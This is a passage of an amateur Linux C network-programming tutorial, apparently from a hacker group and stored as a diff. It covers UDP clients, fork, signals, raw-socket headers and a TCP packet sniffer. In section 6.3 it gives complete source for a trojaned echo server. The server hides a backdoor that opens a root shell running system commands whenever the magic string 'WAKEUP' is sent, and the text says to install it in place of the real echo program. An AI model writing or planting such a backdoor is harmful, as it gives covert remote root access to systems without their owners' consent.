+  struct sockaddr_in servaddr;
+
+  if(argc &lt; 2) {
+
+    printf(&quot;%s [hosts-IP] {port}\n&quot;,argv[0]);
+
+    return(-1);
+
+  }
+
+  sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+
+  if(sockfd &lt; 0) {
+
+    fprintf(stderr, &quot;error, cannot creat socket\n&quot;);
+
+    return(-1);
+
+  }
+
+The top lines are the same as with the server, only that we define MESS. This constant
+contains the string which will be transfered to the server (unimportant what is written in
+it).
+
+The corectness of the passed arguments is checked. The IP is definetly needed, but also a
+port can be stated (optiomal).
+
+We create us a socket.
+
+  servaddr.sin_family = AF_INET;
+
+  if(argc == 3)
+
+    servaddr.sin_port = htons(atoi(argv[2]));
+
+  else servaddr.sin_port = htons(SERV_PORT);
+
+  servaddr.sin_addr.s_addr = inet_addr(argv[1]);
+
+  nbytes = sendto(sockfd, MESS, 11, 0, (struct sockaddr *)&amp;servaddr, sizeof(servaddr));
+
+  if(nbytes &lt; 0) {
+
+    fprintf(stderr, &quot;cannot write\n&quot;);
+
+    return(-1);
+
+  }
+
+  len = sizeof(servaddr);
+
+  nbytes = recvfrom(sockfd, received, sizeof(received), 0, &amp;servaddr, &amp;len);
+
+  if(nbytes &lt; 0) {
+
+    fprintf(stderr, &quot;cannot write\n&quot;);
+
+    return(-1);
+
+  }
+
+  printf(&quot;host %s running: %s\n&quot;,argv[1],received);
+
+  return(0);
+
+}
+
+We initialise the value of the structur. If the user choosed two arguments, we take the
+second argument as target port. Else we use the default port.
+
+We send something to the server and the server send us the information back. Annotated again
+the last argument of recfrom() is a pointer, due to that we declare an extra variable named
+&quot;len&quot;.
+
+And thats how it looks in the field:
+
+loomes:~ # ./sysinfs &amp;
+
+[1] 666       # mm.. should that random pid value tell me something?!
+
+loomes:~ # ./sysinfc 127.0.0.1
+
+host 127.0.0.1 running: Linux version 2.2.18 (root@Pentium.suse.de) (gcc version 2.
+
+loomes:~ # netstat .s  | tail
+
+.
+
+Udp:
+
+    2 packets received
+
+    0 packets to unknown port received
+
+    0 packet receive errors
+
+    2 packets sent
+
+ # for the sucessfull run of this UDP application only
+
+ # two UDP packets are needed. Only
+
+ # the TCP connection buildup needs three packets.
+
+6.0 Sophisticated Server
+
+Till now we only faced primitive application, which are easy to bring to life. Now after we
+know a little bit about the theme, we will take on something bigger. But for this we need
+some new functions which are explained now. Later we will spend some time on the next
+example.
+
+6.1 fork
+
+This function is the only possibility to create new process under linux. When we call &quot;fork&quot;
+the function returns twice. Once the function returns into the calling process (parent
+process) and once in the created proccess (child process) with a value of 0.
+
+All describtors, which are open in the parent-process before the call of &quot;fork&quot; are used
+together with the child-process after the return. Networkserver often use this method.
+
+.fork.s typical apllicatonsarea are:
+
+1. A process makes a copies of it self, so that the copy
+
+   can serve operations while the other copy
+
+   handles other tasks.
+
+2. A process wants to run another programm. It creates a copy
+
+   of it self and now calls &quot;exec&quot;. Through this another
+
+   programm is ececuted.
+
+Functiondefinition
+
+#include &lt;unistd.h&gt;
+
+     pid_t fork(void);
+
+Returnvalue
+
+Returnvalue 0 in childprocess, Process-ID of the child in parent-process. -1 we get on
+failure.
+
+Arguments
+
+---
+
+Maybe some will ask them self what that has to do with networkprogramming. Till now our
+server has devoted his runtime only to one client. That is totaly alright, as long the
+runtime for a client is quite low. But what if our service takes more time? If we write the
+server like we have it now, no other client can be served as long as a client is connected.
+
+We will circumvine this problem nicely, by using &quot;fork&quot; to create a child-process for the
+handling of each client. Meanwhile the parent-process will wait for incoming connections.
+
+Example:
+
+/* start */
+
+...
+
+pid_t pid;
+
+int listenfd, connfd;
+
+bind(listenfd, ...);
+
+listen(listenfd, 20)
+
+for( ; ; ) {
+
+connfd = accept(listenfd, ...);
+
+if( (pid = fork()) == 0) { /* child process */
+
+close(listenfd);  /* child close listening socket */
+
+do_something(connfd); /* does all work */
+
+close(connfd);    /* close sock in child */
+
+exit(0);         /* exit the child */
+
+}
+
+close(connfd);  /* close socket in Parent-Process */
+
+}
+
+We see that after each &quot;accept&quot; call a process is created. It is checked if the returnvalue
+is 0. If yes, we are in the child-process. Than we close the listening socket &quot;listendfd&quot; and
+call a function that further handles the client. After the return of the function the
+connected socket is closed and via &quot;exit&quot; the child process is exited. (!).  A graphik for
+clearaty :
+
+Client                                       Server
+
+                     Connection              listen()
+
+Connect()  &lt;-----------------------------&gt;   connfd
+
+Previous handling
+
+Client                                        Server
+
+                                              listen()
+
+connect()  &lt;------------------------------&gt;   connfd
+
+                  |                             |
+
+                  |                             | fork()
+
+                  |                             |
+
+                  | Connection                  V Child-Server
+
+                  |------------------------&gt;  connfd
+
+Paralell Server handling
+
+To tell the truth the client does not build up a connection with the server process, but
+instead connects with a copy of the child-process. That makes communication with several
+clients at once possible.
+
+But we still have a problem. The termination of the child-process causes us headaces when we
+start the programm like above. Namely after we called &quot;exit&quot;, we not only return into the
+parent-process. The child process becomes a zombie process. Recognazible on the &quot;Z&quot; withing
+the statusoutput of &quot;ps&quot;.
+
+A Zombie is no Undead with drooling mouth that takes on our cat, but a &quot;died&quot; process. The
+process indeed is dead, but still awaits it´s funeral. Zombie-process contain informations
+about the process, but are somehow useless for us. They take up memory and eat up
+describtors. Which can cause function like &quot;fork&quot; or &quot;socket&quot; to fail.
+
+But how do we end a child process right?
+
+A new function for this:
+
+6.2 signal
+
+A Signal is a message for a process, that an event has happened.
+
+Signals can:
+
+Be send from a process to another or to itself.
+
+Be send from the kernel to another process.
+
+The signal on which we will take is called &quot;SIGCHILD&quot; and is send on each processtermination
+from the kernel to the parent-process. More on this later...
+
+With .signal. we can determine that a function should be called, when a certain signal comes
+in. Such functions are called signalhandler. This have no returnvalue and only one integer
+argument.
+
+void sigchild_catch(int sig);
+
+This would be a valid signalhandler.
+
+We are also able to ignore a signal.
+
+Functiondefinition
+
+Sigfunc  *signal(int signalnr, Sigfunc *signalhandler);
+
+Returnvalue
+
+On failure SIG_ERR.
+
+Arguments
+
+.signalnr. should be a constant, that stands for signals. Examples are SIGALRM, SIGURG,
+SIGPOLL or SIGKILL.
+
+.signalhandler. is the name of the function which should be called, to react on the given
+signal.
+
+Example
+
+if(singal(SIGCHLD, sigchild_catcher) == SIG_ERR) printf(.warning: cannot install
+signalhandler.\n.);
+
+In this example we call &quot;signal&quot; within a &quot;if&quot; controllstructur to direclty capture the
+returnvalue. If the returnvalue is SIG_ERR, we want to be notified. Otherwise the
+signalhandler is installed sucsesfully. As the first argument we take the constant &quot;SIGCHILD&quot;
+and as a reaction to the receivment of this singal, the function &quot;sigchild_catcher&quot; should be
+called.
+
+void sigchild_catcher(int signo)
+
+{
+
+pid_t pid;
+
+int stat;
+
+pid = wait(&amp;stat);
+
+return;
+
+}
+
+So as an example a SIGCHILD handler could look like this. With the &quot;wait&quot; function we avoid
+that the process mutates to a zombie. When ever we start a child-process with &quot;fork&quot;, we have
+to wait for them with &quot;wait&quot; so they don´t become a zombie. First this sounds a little
+abstract, but after an example things will clear.
+
+#######NOTE#######
+
+Better would be the Usage of &quot;waitpid&quot;.
+
+##################
+
+6.3 Exampleprogrammm (paralell Server)
+
+In our example we will take on an echoserver. A client connects with the echoserver (tcp/7)
+and sends its strings. The server reads these and sends them back. That means that the client
+can take up undefined time. So we have to write a paralellserver, cause we want to serve more
+than one client.
+
+The Tut would be no .ES-C. Tut, if we would not change the echoserver into a trojan horse
+variant :) So the server serves the echoservice, but when we send a certain string
+(MAGICKEY), kind of a shells opens for us. Within we can run systemcommands via &quot;system&quot;.
+Cause the echoservice holds root-rights, we can run our Shell-commands with root-access. With
+the string &quot;quit&quot; we vanish into the regular echoserver.
+
+/* echoser.c
+
+a faked echo server -&gt; backdoor inclusive.
+
+remove the original echo program and put this on its place.
+
+just connect with telnet to it.
+
+it acts like a normal echo server but if u typ in the MAGICKEY
+
+(its #defined - change it) u ll see the igors prompt.
+
+their u can type all systemcommands u want to execute and igor will
+
+do the rest for u...
+
+to quit from the igor prompt type &quot;quit&quot; and u ll find urself again in
+
+the normal echo application.
+
+l0om
+
+*/
+
+#include &lt;stdio.h&gt;
+
+#include &lt;netinet/in.h&gt;
+
+#include &lt;sys/socket.h&gt;
+
+#include &lt;sys/wait.h&gt;
+
+#include &lt;sys/signal.h&gt;
+
+#define   MAGICKEY   &quot;WAKEUP&quot;
+
+int echofunk(int sockfd);
+
+int igor(int sockfd);
+
+void sig_chld(int signo);
+
+We include our headerfiles. We define a constant which stands for MAGICKEY. When like above
+&quot;WAKEUP&quot; is put in, the &quot;igor-shell&quot; is started.
+
+Following are the functionprototyps like &quot;echofunk&quot;, which provides the actuall echo-service
+to the client. &quot;igor&quot; provides the &quot;igor-shell&quot; and &quot;sig_chld&quot; is our signalhandler.
+
+int echofunk(int sockfd)
+
+{
+
+  ssize_t bytes;
+
+  char buffer[150];
+
+  memset(buffer, '\0', sizeof(buffer));
+
+  while( (bytes = read(sockfd, buffer, sizeof(buffer))) &gt; 0) {
+
+    if(strncmp(buffer,MAGICKEY, strlen(MAGICKEY)) == 0)
+
+      igor(sockfd);
+
+    buffer[bytes] = '\0';
+
+    if(write(sockfd, buffer, sizeof(buffer)) != sizeof(buffer))
+
+      return -1;
+
+    memset(buffer,'\0',sizeof(buffer));
+
+  }
+
+}
+
+The .echofunk. function has the connected describtor as argument which also wants the int of
+the &quot;read&quot; function as input. The received data are written into &quot;buffer&quot; and searched for
+our &quot;MAGICKEY&quot;. If it is found we start the &quot;igor&quot; function. Otherwise we write the received
+data back to the socket. &quot;memset&quot; fills &quot;buffer&quot; with &quot;\0&quot;. Within this function there still
+is a problem for the correct run of the programm hidden. Have Phun while searching.   ;)
+
+ int igor(int sockfd)
+
+{
+
+  int status = 0;
+
+  ssize_t bytes;
+
+  char syscommand[100];
+
+  write(sockfd, &quot;say quit to exit IGOR-PROMPT\n\n&quot;,32);
+
+  while(status == 0) {
+
+    memset(syscommand, '\0',sizeof(syscommand));
+
+  if(write(sockfd, &quot;IGOR-PROMPT&gt; &quot;,13) != 13)
+
+    exit(0);
+
+  bytes = read(sockfd, syscommand, sizeof(syscommand));
+
+  if(bytes &lt; 0) return -1;
+
+  else if(bytes == 0) return 0;
+
+  if(strncmp(syscommand, &quot;quit&quot;, 4) == 0)
+
+    status = 1;
+
+  syscommand[bytes] = '\n';
+
+  if(system(syscommand) &lt; 0) {
+
+    write(sockfd, &quot;System-error\n&quot;, 13);
+
+      exit(0);
+
+  }
+
+  write(sockfd,&quot;done...\n&quot;,8);
+
+  }
+
+  return 0;
+
+}
+
+In the string .syscommand. our Shell-command is put down later and as an argument passed to
+&quot;system&quot;. First we are greeted by &quot;igor&quot;. We put out some kind of prompt &quot;IGOR-PROMPT&gt;&quot; and
+then read the output of the user. We controll the correct run of &quot;read&quot; (what we also should
+do in main!) and check if the user wants to leave the shell with &quot;quit&quot;. Then &quot;system&quot; is
+called with our command&quot;. &quot;system&quot; creates another process   with &quot;fork&quot; and therein runs an
+&quot;exec&quot; call and so is able to run an alredy existing programm in the filesystem. It is
+checked if &quot;system&quot; has a returnvalue under 0. If this is the case the fucntion failed and
+the &quot;igor&quot; shell is terminated. Otherwise &quot;done&quot; is put out..
+
+void sig_chld(int signo)
+
+{
+
+  pid_t pid;
+
+  int stat;
+
+  pid = wait(&amp;stat);
+
+  return;
+
+}
+
+Our signalhandler for the preventation of zombies.
+
+int main(void)
+
+{
+
+  pid_t pid;
+
+  int sockfd, connfd;
+
+  struct sockaddr_in servaddr;
+
+  memset(&amp;servaddr, '\0',sizeof(servaddr));
+
+  servaddr.sin_family = AF_INET;
+
+  servaddr.sin_port = htons(7);
+
+  servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
+
+  sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+  if(sockfd &lt; 0) {
+
+    printf(&quot;cannot creat socket\n&quot;);
+
+    return -1;
+
+  }
+
+  bind(sockfd, (struct sockaddr *)&amp;servaddr, sizeof(servaddr));
+
+  listen(sockfd, 12);
+
+  signal(SIGCHLD,sig_chld);
+
+  while(1&gt;0) {
+
+    connfd = accept(sockfd, (struct sockaddr *)NULL,NULL);
+
+    if( (pid = fork()) == 0) {   /* child */
+
+      close(sockfd);
+
+      echofunk(connfd);
+
+      exit(0);
+
+    }
+
+    close(connfd);
+
+  }
+
+  return 0;
+
+}
+
+Within the &quot;main&quot; function there realy is nothing new. Like before via &quot;sockaddr_in&quot; we pass
+protocollinformatin which we bind to the socket with &quot;bind&quot; and with &quot;listen&quot; we wait for
+incoming connections.   Then we esthablis our signalhandler, for the receivment of &quot;SIGCHILD&quot;
+signal. Then we pick up a complete connection with &quot;accept&quot; out of the waitingque. We create
+with &quot;fork&quot; a new child, which takes on the handling of the echo-service for the server. The
+server meanwhile waits for new incoming connections.
+
+Even this server still is knitted simple knitted. But this Tut is only a introduction at all.
+
+7.0 Introduction to Raw-Sockets
+
+With Raw-Sockets we are able to remove the transparency of a connection and knot our own
+datapackets. We are able to initialise all existing flags or to ascertain the datacontent of
+the packet. Raw-socket programming is often helpfull like we see in programms likes &quot;ping&quot;
+&quot;trace-route&quot; or &quot;nmap&quot;.
+
+TO be able to use raw-sockets we first should create one. We make that happen by calling
+&quot;socket&quot; like following:
+
+rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+
+So we are able to write our own ICMP datapacket, or to receive. When a ICMP packet comes in
+now, we can read it with &quot;read&quot; and evaluate it. All ICMP packets are   guided through the
+&quot;rawsock&quot; interface. We can send packets with &quot;send&quot; or &quot;sendto&quot; calls. More on this later
+when we need it.
+
+Under Linux we got some special headerfile which can be used for Raw-IP. So for example we
+got &quot;netinet/ip.h&quot; for a correct IP header, &quot;netinet/ip_icmp&quot; for a correct ICMP header or
+&quot;netinet/udp.h&quot; for a ready UDP header.
+
+Lets turn to the basic knowledge of TCP/IP, remember how a datapacket is structured. first we
+got the IP header, which so to say is our drugde. Without IP packets won´t find their target
+in the network..  After that the wanted protocol which should be transported. So for example
+after IP a TCP or ICMP header can follow.
+
+7.1 Header Structurs
+
+We will focus on the TCP, UDP and ICMP headers. I will refer to the BSD structur, cause i
+think its the best variant. Don´t panic the BSD header natuarly is available. Just before we
+include our header bind a constant with the name &quot;__FAVOR_BSD&quot;. With IP &quot;__USE_BSD&quot; we will
+stick to the standard, to get to know it a bit better. Who does not lean towards BSD, can
+inform himself with a &quot;emacs /usr/include/netinet/ip.h || tcp.h || ip_icmp.h&quot; about each
+standard header. Take into acount that these header structurs natuarly don´t differ from the
+other headers. The only diffrence is the naming of each structurelement.
+
+Further more i will describe the function of the datafields in the packets.
+
+First i will name the complete name of each field and then the datatypename which the
+accordant structurlement carries.
+
+7.1.1 IP header
+
+Version (4 bits)  -  unsigned int version:4
+
+This field contains the used version of IP. Now aday the rule is still version 4.
+
+IHL (4 bits) . unsgined int ihl:4
+
+IHL gives the length of the IP headers in multiple of 32bits, namely 4 Bytes. Through this a
+value of 5 occurs(5*32 = 160 Bits = 20 Bytes).
+
+Type of Service (8 bits) . u_int8_t tos
+
+Here the quality of service is put down. The 8 bit long field can be keyed like that:
+
+|Priority|D|T|R|C|O|
+
+ -Priority (3 bits)
+
+These Bits names of the eight priority levels. Here a higher value stands for a higher
+priority.
+
+0         -  Normal
+
+1         -  Priority
+
+2         -  Immediate
+
+3         -  Flash
+
+4         -  Flash override
+
+5         -  Critical
+
+6         -  Internet Control
+
+7         -  Network Control
+
+Thefurther Bits call for more features for the tranfser
+
+D-Bit:   delay       calls for a connection with short delay.
+
+T-Bit:   troughput   calls for high data througput
+
+R-Bit:   reliability calls for high security
+
+C-Bit:   Cost        calls for tour with low cost (who does´nt want this...)
+
+The last bit is not used right now.
+
+Packetlength (total lenght) (16 bit) . u_int16_t tot_len
+
+Contains the total length of the datagram. Clearly this means the length of the IP header +
+(TCP/UDP/ICMP) header length + data.
+
+By the way the maximum size is: 65535 bytes.
+
+Identification (identification) (16 bits) . u_int16_t id
+
+This value is used for the numbering of fragmentet datagrams. Each packet should have a
+explicit nuber, for this the value is often incrementend by one.
+
+Flags (3 bit) . unsigned int flags:4
+
+If a fragmentation is taken place it is controll by this field.
+
+O|DF|MF
+
+The first bit O is not used and is always 0.
+
+DF: stands for Do-Not-Fragment and prohibits as long as it set a furhter fragmentation of the
+datapacket.
+
+MF: stands for More-Flag and states that more further fragmentation is wanted. If its 0 this
+is the last or the only fragment of a packet.
+
+Fragment-Offset (13 bits) . u_int16_t frag_off
+
+When fragmented datagrams are send, this value states the position of the data in the origin
+datagram
+
+TTL (time to live) (8 bits) . u_int8_t ttl
+
+With this value we can give the lifetime of our packet in hops. Each time a IP packets is
+forwarded by a router its ttl is decremented by one. On zero the packet is eaten.
+
+Protokoll (8 bits) . u_int8_t protocol
+
+This field names the overlaying transportprotocol.
+
+Bsw. ip-&gt;protocol = IPPROTO_TCP;
+
+Header Checksumme (16 bits) . u_int16_t check
+
+Ip secures the corectnes of the ip data in this field Here the value is only calculated out
+of the ip header. The transportprotocol and the data each overlyaing protocol has its own
+checksum.
+
+Quell IP (source ip) (32 bits) . u_int32_t saddr
+
+Here the ip adress of the sender is stated.
+
+Ziel IP (dest ip) (32 bits) . u_int32_t daddr
+
+Here the ip adress of the receiver is stated.
+
+Options [optimal] (variable) . unspecified
+
+It can be 40 Bytes long. Which options can be packed in, can be read in a RFC ( i never used
+this field till now).
+
+7.1.2  TCP Header
+
+Here we use the BSD variant.
+
+Source-Port (16 bits) . u_int16_t th_sport
+
+Sender Port.
+
+DEstination-Port (16 bits) . u_int16_t th_dport
+
+Destination Port.
+
+Sequenznumber (32 bits) . tcp_seq th_seq
+
+This field is used for the numbering of the respectively first data-bytes of the whole
+datastream.
+
+During connection build up, the partners negotiate on a Seq-number. After that the connection
+is established. When Hijacking you also have to arm your packets with the right seq-number.
+
+Acknowledgement-Nummer (32 bits) . tcp_seq th_ack
+
+All datapackets are confirmed till the stated number -1. But it is only valid, when the ACK
+Flag is set.
+
+Data Offset (4 bits) . u_int8_t th_off:4
+
+Equivilates the length of the TCP header in 32bit blocks. With no options 5.
+
+Reserved (6 bits)
+
+Carries no value (always set to 000000 ).
+
+Flags (8 bits) . u_int8_t th_flags
+
+FIN . TH_FIN  0x01
+
+As soon as a station transmited all its data, this flag is singaled. If the receiver also
+sends a FIN the connection is terminated.
+
+SYN . TH_SYN  0x02
+
+The SYN Flag is used during connection build up.
+
+RST . TH_RST  0x03
+
+This Bit indicates an occured error as the cause, that the connection is to be deleted or in
+an answer to an connection request states that it was refused.
+
+PSH . TH_PUSH  0x08
+
+Should the packet on arival be directly given over to the application this flag has to be
+set.
+
+ACK . TH_ACK  0x10
+
+This Flag signals that the value of the acknowlegment number is valid.
+
+URG . TH_URG  0x20
+
+With this datapackets are to be transmited with special high priority. If this bit is set,
+the urgent pointer-field is evaluated. URG program technicaly is used with UOB data and
+indicates an exception (for sure with the select function).
+
+#########NOTE#########
+
+We set the flags with the help of the &quot;|&quot; operator.
+
+Tcp-&gt;th_flags = TH_SYN | TH_FIN; /* sets syn and fin */
+
+We check the flags with the help of .&amp;. operator.
+
+If(tcp-&gt;th_flags &amp; TH_SYN) /* if syn is set, then... */
+
+#######################
+
+Window (16 bits) . u_int16_t th_win
+
+Here we send to the receiver how many data at once are allowed to be send back.
+
+Check-Summe (16 bits) . u_int16_t th_sum
+
+SErves as a control of the TCP headers and the data. A packet with false checksum is
+discarded silenty. (that i had to expirence painfully at the first raw-ip trial...)..
+
+Options [optimal] (variable) . undefined
+
+I point to the according RFCs. I don´t have any expirience with this field..
+
+7.1.3 UDP Header
+
+Also here we take on the BSD variant.
+
+Source-Port (16 bits) . u_int16_t uh_sport
+
+Source Port.
+
+Destination-Port (16 bits) . u_int16_t uh_dport
+
+Destination Port
+
+Length (16 bits) . u_int16_t uh_ulen
+
+Here is stated how long the UDP packet is (UDP header + data).
+
+Check-Sum (16 bits) . u_int16_t uh_sum
+
+This field serves as a control of the corectnes of the header- and dataarea.
+
+7.1.4   ICMP Header
+
+Here the standard header again. How wants BSD: .#define __USE_BSD..
+
+Icmp typ (8 bits) . u_int8_t type
+
+some icmp type example
+
+0       echo reply                    echo answer
+
+3       destination unreachable       receiver not reachable
+
+4       source quench                 puffer ressourcs are used up
+
+5       redirect                      path redirection
+
+8       echo request                  echo anforderung
+
+11      time exeeded                  time span for a datagram run out
+
+12      parameter problem             parameter problem
+
+13      time stamp                    time stamp request
+
+14      time stamp reply              time stamp answer
+
+17      address mask request          adressmask request
+
+18      address mask reply            adressmask answer
+
+Icmp code (8 bits) - u_int8_t code
+
+Here depending on the type of messsage additional information can be given.
+
+Icmp Checksumme (16 bits) . u_int16_t checksum
+
+Like always here the correctnes of the icmp headers and the data is checked..
+
+     So. With that we have talked about all transport headers an all
+
+     flags are clear.
+
+So we create a ICMP-packet.
+
+/* start */
+
+struct iphdr *ip;
+
+struct icmphdr *icmp;
+
+char *packet;
+
+...
+
+packet = (char *)malloc(sizeof(struct iphdr)+sizeof(struct icmphdr));
+
+ip = (struct iphdr *) packet;
+
+icmp = (struct icmphdr *) (packet + (sizeof(struct iphdr));
+
+...
+
+ip-&gt;saddr = inet_addr(argv[1]);
+
+...
+
+icmp-&gt;code = 0;
+
+...
+
+/* end */
+
+Here we declare first a pointer to a IP structure and afterwards one to an ICMP structur.
+Then we create with the help of &quot;malloc&quot;   a datapuffer wich holds the size of one IP and one
+ICMP header.  Then with the help of the type change (cast) we set our headerstructur into the
+datapufer. with the help of the .-&gt;. operator we can now define the information for our
+packet.
+
+7.1.5   Pseudo Header
+
+The calculation of the checksum of TCP and UDP only works with a correct Pseduohdr. This
+contains the sender ip, receiver ip, length and protocoll.
+
+/* define the pseudohdr */
+
+struct pseudohdr {              /* for creating the checksums */
+
+  unsigned long saddr;
+
+  unsigned long daddr;
+
+  char useless;
+
+  unsigned char protocol;
+
+  unsigned short length;
+
+};
+
+How this works program technically, you can see in my two example function &quot;sendtcp&quot; and
+&quot;sendupd&quot; a bit closer.
+
+7.2  Exampleprogramm
+
+We will will write a packetsniffer. This will capture TCP packets and if we like put out the
+set Flags and/or data content.
+
+/*  psniff.c        a TCP port sniffer
+
+          l0om
+
+*/
+
+#include &lt;stdio.h&gt;
+
+#include &lt;ctype.h&gt;
+
+#include &lt;sys/types.h&gt;
+
+#include &lt;unistd.h&gt;
+
+#include &lt;netinet/in.h&gt;
+
+#include &lt;netinet/ip.h&gt;
+
+#include &lt;netinet/tcp.h&gt;
+
+#include &lt;signal.h&gt;
+
+#define       BUFFSIZE          2048
+
+struct iphdr *ip;
+
+struct tcphdr *tcp;
+
+void help();
+
+void data(char *data, int nbytes);
+
+void flags();
+
+static void get_intr(int sig);
+
+WE include first the nedded headerfiles. This time we need the structurs for a IP and a TCP
+packet, so we ask &quot;netinet/ip.h&quot; and n&quot;netinet/tcp.h&quot; for help. A constant named BUFFSIZE is
+set, which can be changed on need of the user..
+
+The &quot;ip&quot; and &quot;tcp&quot; structur are declared global. Following are the functionprototyps. &quot;data&quot;
+gives the datacontent and &quot;flags&quot; the set flags. &quot;get_intr&quot; is a signalhandler for the
+interupsingal with which the programm can be ended by the user (CRTL+C).
+
+void get_intr(int sig)
+
+{
+
+  sleep(1);
+
+  printf(&quot;got interrupt signal- exiting...\n&quot;);
+
+  exit(0);
+
+}
+
+The signalhandler.
+
+void data(char data, int nbytes)  /* shows u the data */
+
+{
+
+  char *ptr = &amp;data[0];
+
+  int n = 0;
+
+  printf(&quot;data: %d\n&quot;,nbytes);
+
+  while(nbytes-- &gt; 0) {
+
+    n++;
+
+    if((n%25)==0) printf(&quot;\n&quot;);
+
+    if(isgraph(*ptr++)) printf(&quot;%c&quot;,*ptr);
+
+    else printf(&quot;.&quot;);
+
+  }
+
+}
+
+With this function we let us show the data of a packet. The first argument has to be a
+pointer to the beginning of the dataconent. &quot;nbyte&quot; whereaas is the length of the
+datacontent. The pointer &quot;ptr&quot; which point to the begining of the datacontent, is incremented
+in a while loop. Each time the &quot;isgrap&quot; fucntion is called. If TRUE the character on which
+the pointer points is printable and it should be printed. Otherwise it should print a &quot;.&quot;.
+after 25 character a linebreak should happen, to keep the format readable.
+
+void flags()
+
+{
+
+  printf(&quot;  &quot;);
+
+  if(tcp-&gt;syn == 1)
+
+    printf(&quot;syn=1 &quot;);
+
+  if(tcp-&gt;ack == 1)
+
+    printf(&quot;ack=1 &quot;);
+
+  if(tcp-&gt;rst == 1)
+
+    printf(&quot;rst=1 &quot;);
+
+  if(tcp-&gt;fin == 1)
+
+    printf(&quot;fin=1 &quot;);
+
+  if(tcp-&gt;urg == 1)
+
+    printf(&quot;urg=1 &quot;);
+
+  if(tcp-&gt;psh == 1)
+
+    printf(&quot;psh=1 &quot;);
+
+  printf(&quot;\n&quot;);
+
+}
+
+Cause the &quot;tcp&quot; structur is global, we can walk flag by flag and have printed, which flagds
+are set..
+
+void help() {
+
+  puts(&quot;\n------\npsniff\n------\n&quot;);
+
+  puts(&quot;l0om&quot;);
+
+  puts(&quot;psniff is a smal tcp port(/protocol) sniffer.&quot;);
+
+  puts(&quot;example:&quot;);
+
+  puts(&quot;-h:   prints out this help menue&quot;);
+
+  puts(&quot;-P:   next argument must be the portnumber u want to sniff&quot;);
+
+  puts(&quot;-D:   prints out all (ASCII)data form all packets&quot;);
+
+  puts(&quot;-F:   shows the set flags&quot;);
+
+  puts(&quot;example:&quot;);
+
+  puts(&quot;./psniff -P 7 -D -F&quot;);
+
+  puts(&quot;sniffs packets for/from port 7. prints out all data and set flags&quot;);
+
+  puts(&quot; u want to sniff 7 &amp;&amp; 80? &quot;);
+
+  puts(&quot;./psniff -P 7 -D -F &amp;; ./psniff -P 80 -F -D &amp;&quot;);
+
+}
+
+Here is the helpmenue for the retard user.
+
+int main(int argc, char **argv)
+
+{
+
+  int sockfd;
+
+  int i;
+
+  int port = 80;                    /* standard */
+
+  int r_flags, r_data;
+
+  size_t bytes;
+
+  char buffer[BUFFSIZE];
+
+  char *dats;
+
+  if( (getuid()|getgid()) != 0) {
+
+    printf(&quot;error: u must be root\n&quot;);
+
+    return -1;
+
+  }
+
+  r_flags=r_data=0;
+
+  sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+
+  if(sockfd &lt; 0) {
+
+    fprintf(stderr, &quot;error: cannot creat socket\n&quot;);
+
+    return -1;
+
+  }
+
+  if(argc == 1) {
+
+    printf(&quot;using standard settings...\n\n&quot;);
+
+    r_flags = 1;
+
+  }
+
+  for(i = 0; i &lt; argc; i++) {
+
+    if(strncmp(argv[i], &quot;-D&quot;, 2) == 0)
+
+      r_data = 1;
+
+    if(strncmp(argv[i], &quot;-F&quot;, 2) == 0)
+
+      r_flags = 1;
+
+    if(strncmp(argv[i], &quot;-P&quot;, 2) == 0)
+
+      port = atoi(argv[++i]);
+
+    if(strncmp(argv[i], &quot;-h&quot;, 2) == 0) {
+
+      help();
+
+      exit(0);
+
+    }
+
+  }
+
+  if(signal(SIGINT, get_intr) == SIG_ERR)
+
+    printf(&quot;cannot install Interrupt catcher\n&quot;);
+
+  ip = (struct iphdr *)buffer;
+
+  tcp = (struct tcphdr *) (buffer + sizeof(struct iphdr));
+
+  dats = buffer+(sizeof(struct iphdr)+sizeof(struct tcphdr));
+
+  while( (bytes = read(sockfd, buffer, BUFFSIZE)) &gt; 0) {
+
+  if(ntohs(tcp-&gt;dest) == port || ntohs(tcp-&gt;source) == port) {
+
+      printf(&quot;tcp:  dport=%d, sport=%d, from=%s&quot;
+
+                 ,ntohs(tcp-&gt;dest),ntohs(tcp-&gt;source),inet_ntoa(ip-&gt;saddr));
+
+      if(r_flags)
+
+            flags();
+
+      else printf(&quot;\n&quot;);
+
+      if(r_data) {
+
+            printf(&quot;\n&quot;);
+
+            data(dats, bytes-(sizeof(struct iphdr)+sizeof(struct tcphdr)));
+
+            printf(&quot;\n\n&quot;);
+
+      }
+
+    }
+
+  memset(buffer, '\0', BUFFSIZE);
+
+  }
+
+  return (0);
+
+}
+
+Here the main fucntion. We create us a TCP raw-socket. With the variables &quot;r_flags&quot; and
+&quot;r_data&quot; we can check if the user wants the flags or the dataconent to be shown. We work with
+the help of the &quot;i&quot; varibale we work through argument for argument and look for set options.
+We install our signalhandler for interrupt-signals. It is time for our datapacket to be
+declared and initialised. We set the datapuffer for our IP and TCP structur.
+
+Now we start the invinit loop, which is always true wenn the &quot;read&quot; function gets data over
+the raw-socket.
+
+Then we check if the packet is to be shown. If it is the right dest or source port, we start
+with the output of the destination port, the senderadress also the senderport. Then we see
+with the help of the &quot;r_flags&quot; variable if the user want to have the set flags output. If yes
+we do it with the help of the &quot;flags&quot; function. The same happens with the datacontent and the
+&quot;r_data&quot; variable.
+
+.dats. is a pointer to the datacontent and when we subtract the IP and TCP header from the
+received data (&quot;byts&quot;) , we get the sum of the datacontent in bytes. After all this we delet
+the content of the puffer via &quot;memset&quot; and the loop continues, beside if the process gets the
+interrupt-signal.
+
+7.3  sendto
+
+Although we know this function already from the UDP application, we will walk through it
+again, cause without nothing goes.
+
+In this programm we take on the data reception trough a raw-sock. Now we want to take on the
+sending of self created datapackets. For this we use the &quot;sendto&quot; function. This function by
+default is used for the handling of UDP, but also is suited for raw-ip.
+
+#include &lt;sys/socket.h&gt;
+
+ssize_t sendto(int sockfd, const void *buffer, size_t nbytes, int flags, struct sockaddr *to,
+socklen_t *addrlen);
+
+Returnvalue
+
+If Ok the function returns the number of send bytes.
+
+On error we get -1.
+
+Arguments
+
+The first argument is a socket over which should be send. &quot;buffer&quot; is the datapuffer which
+will be send and &quot;nbytes&quot; its size. The value &quot;flags&quot; we let be 0. With the help of a
+&quot;sockaddr&quot; structur named &quot;to&quot; we link to the send destination. &quot;addrlen&quot; is like before the
+size of the structur in bytes.
+
+Example
+
